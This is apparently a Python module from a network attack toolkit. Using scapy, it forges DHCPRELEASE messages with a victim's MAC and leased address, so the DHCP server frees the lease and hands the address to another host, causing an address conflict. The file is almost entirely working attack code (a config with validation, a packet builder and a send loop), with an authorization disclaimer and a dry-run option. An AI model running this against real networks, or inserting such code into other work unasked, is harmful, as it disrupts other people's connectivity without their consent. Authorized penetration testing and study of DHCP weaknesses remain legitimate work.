"""DHCP release spoofing: send a DHCPRELEASE for a lease that another client holds.

A client that no longer needs its address sends DHCPRELEASE to the server that granted
it. The server then frees the lease, and it can hand the address to another client.
The release is not authenticated: the server trusts the client MAC, address and server
identifier it carries.

This module sends such a release once per message, from this interface, with the
victim's MAC and leased address copied by the operator. The victim keeps using its
address, so a later assignment of that address to another host causes a conflict.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import BOOTP, DHCP, IP, UDP, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, normalize_unicast_mac

SERVER_PORT = 67
CLIENT_PORT = 68
MAX_RELEASES = 100


@dataclass(frozen=True)
class ReleaseSpoofingConfig:
    iface: str                          # attacker interface, on the segment with the server
    client_mac: str                     # the victim's MAC, copied from its traffic (required)
    client_ip: str                      # the victim's leased address (required)
    server_ip: str                      # the DHCP server's address, also the server identifier
    server_mac: str = ""                # the server's MAC; empty = broadcast the release
    releases: int = 1                   # releases to send
    dry_run: bool = False               # build releases but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.client_mac)
        if self.server_mac:
            normalize_unicast_mac(self.server_mac)
        for name, value in (("Client address", self.client_ip), ("Server address", self.server_ip)):
            try:
                ipaddress.IPv4Address(value)
            except ValueError as exc:
                raise ValueError(f"{name} must be an IPv4 address.") from exc
        if not 1 <= self.releases <= MAX_RELEASES:
            raise ValueError(f"Releases must be between 1 and {MAX_RELEASES}.")


@dataclass
class ReleaseSpoofingStats:
    releases: int = 0
    status: str = ""


def build_release(config: ReleaseSpoofingConfig, xid: int) -> Packet:
    """DHCPRELEASE for the victim's lease, addressed to the server."""
    client_mac = normalize_unicast_mac(config.client_mac)
    chaddr = bytes.fromhex(client_mac.replace(":", "")).ljust(16, b"\x00")
    dst_mac = normalize_unicast_mac(config.server_mac) if config.server_mac else BROADCAST_MAC
    return (
        Ether(src=client_mac, dst=dst_mac)
        / IP(src=config.client_ip, dst=config.server_ip)
        / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
        / BOOTP(op=1, xid=xid, chaddr=chaddr, ciaddr=config.client_ip)
        / DHCP(options=[
            ("message-type", "release"),
            ("server_id", config.server_ip),
            "end",
        ])
    )


def run_release_spoofing(
    config: ReleaseSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[ReleaseSpoofingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> ReleaseSpoofingStats:
    """Send the releases once each, unless `stop_event` is set first."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = ReleaseSpoofingStats(
            status=(
                f"Dry run: would send {config.releases} DHCPRELEASE message(s) for {config.client_ip} "
                f"({config.client_mac}) to {config.server_ip}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = ReleaseSpoofingStats()
    for _ in range(config.releases):
        if stop_event.is_set():
            break
        send(build_release(config, rng.getrandbits(32)), iface=config.iface, verbose=False)
        stats.releases += 1
        on_progress(replace(stats))
    return stats
